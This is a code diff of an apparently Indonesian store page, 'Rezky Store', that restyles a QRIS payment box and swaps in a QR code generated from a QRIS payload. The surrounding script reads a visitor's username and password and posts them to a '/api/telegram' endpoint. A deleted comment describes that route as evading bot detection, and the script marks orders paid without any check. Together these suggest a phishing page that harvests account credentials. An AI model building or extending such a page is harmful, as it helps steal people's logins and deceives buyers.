@@ -204,15 +204,19 @@
   .input-group input:focus { outline: none; border-color: var(--accent); }
 
   .qris-box { text-align: center; }
-  .qris-box img {
-    width: 240px;
-    height: auto;
+  .qris-wrapper {
     background: #fff;
-    padding: 10px;
+    padding: 14px;
     border-radius: 12px;
     margin: 16px auto;
-    display: block;
+    display: inline-block;
     box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  }
+  .qris-wrapper img {
+    width: 220px;
+    height: 220px;
+    object-fit: contain;
+    display: block;
   }
   .status-badge {
     display: inline-block;
@@ -380,8 +384,10 @@
             <span class="status-badge status-idle" id="paymentStatusBadge">Status: Belum Ada Pesanan</span>
           </div>
 
-          <!-- Base64 QRIS Rezky Store Asli Full Resolusi -->
-          <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" alt="QRIS Rezky Store" id="qrisImage" />
+          <!-- QRIS Rezky Store Asli via QR Server -->
+          <div class="qris-wrapper">
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=00020101021126570014COM.GO-PAY.WWW011893600914310264982966500303UMI51440014ID.CO.QRIS.WWW0215ID10264982966500303UMI5204599953033605802ID5911RezkyStore6013JakartaPusat6304C1B4" alt="QRIS Rezky Store" id="qrisImage" />
+          </div>
 
           <div style="font-size: 11px; color: var(--text-muted); line-height: 1.5; margin-top: 10px;">
             <strong>Rezky Store</strong><br>
@@ -462,7 +468,6 @@
 
     document.getElementById("historyText").innerHTML = `📦 Produk: <strong>${activeProduct}</strong><br>💰 Nominal: <strong>Rp ${activePrice}</strong><br>⚡ Status: <span style="color:var(--green)">LUNAS / MENUNGGU ADMIN</span><br>🌐 Waktu: ${new Date().toLocaleString()}`;
 
-    // Nembak ke Backend API terpisah (/api/telegram) agar bersih & anti deteksi bot
     fetch('/api/telegram', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -487,7 +492,6 @@
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
     
-    // Nembak ke Backend API terpisah (/api/telegram)
     fetch('/api/telegram', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
